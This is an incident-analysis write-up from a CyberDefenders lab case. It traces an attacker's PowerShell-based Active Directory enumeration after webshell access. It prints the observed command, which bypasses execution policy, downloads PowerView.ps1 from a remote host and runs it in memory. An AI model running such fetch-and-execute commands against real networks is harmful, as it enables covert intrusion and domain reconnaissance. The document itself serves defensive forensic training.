# Case 003 — Active Directory Enumeration via PowerShell

**Case ID:** 003  
**Author:** Ryan Valera  
**Time Standard:** UTC  
**Source Platform:** CyberDefenders CyberRange  

## Purpose
This document analyzes the attacker’s Active Directory enumeration activity conducted after establishing webshell access. It identifies the tooling used, execution method, and network protocol leveraged to gather domain information.

## Data Sources
- PCAP (E-001)
- Wireshark HTTP stream inspection
- Zeek HTTP metadata

All timestamps referenced below are treated as **UTC**.

## PowerShell Execution Observed

Following initial command execution through the webshell, the attacker transitioned to PowerShell-based reconnaissance. Commands were executed directly through the same webshell interface using HTTP POST requests.

### Execution Characteristics
- **Interpreter:** PowerShell
- **Execution Policy:** Bypassed
- **Execution Method:** In-memory (no script written to disk)

This execution pattern is consistent with attempts to evade host-based detection.

## Tool Identification

### PowerView.ps1
The PowerShell command retrieved and executed a well-known Active Directory reconnaissance script:

- **Tool Name:** PowerView.ps1
- **Framework:** PowerSploit
- **Source URL:**  
  `https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Recon/PowerView.ps1`

The script was downloaded and executed in-memory using `Invoke-WebRequest` and `Invoke-Expression`.

## Observed PowerShell Command Pattern

The following execution pattern was observed within HTTP request parameters:
```
powershell -exec Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Recon/PowerView.ps1' -UseBasicParsing);
Get-Domain"
```

This confirms:
- Remote script retrieval
- Immediate execution without persistence
- Use of PowerView’s domain discovery functions

## Domain Information Retrieved

The PowerView output returned key domain metadata, including:

- **Forest:** `ad.compliantsecure.store`
- **Domain Name:** `ad.compliantsecure.store`
- **Domain Controller:** `DC01.ad.compliantsecure.store`
- **Domain Mode Level:** 7
- **Executing Context:** `SYSTEM` on `HRWEBSERVER`

This information provided the attacker with a complete view of the domain structure and primary controller.

## Network Protocol Used

Although the command execution occurred over HTTP, the enumeration itself relied on:

**Primary Protocol:** LDAP

PowerView uses LDAP queries to communicate with the Domain Controller and retrieve directory objects, group memberships, and system information.

## Analytical Assessment

The use of:
- PowerView.ps1
- In-memory PowerShell execution
- LDAP-based directory queries

Demonstrates deliberate and informed Active Directory reconnaissance. This activity strongly indicates preparation for:
- Credential targeting
- Lateral movement
- Access to file servers and sensitive resources

## Impact on Investigation Flow

Successful AD enumeration enabled the attacker to:
- Identify domain-joined systems
- Locate high-value targets (e.g., file servers)
- Plan credential access and pivoting strategies

Subsequent analysis focuses on **host targeting and SMB-based enumeration** within the internal network.

## Next Investigative Pivot

Following domain enumeration:
- Identify which domain-joined host was targeted next
- Analyze SMB traffic for share discovery
- Track lateral movement attempts

**Next file:**  
`analysis/006-internal-host-targeting-and-smb-discovery.md`
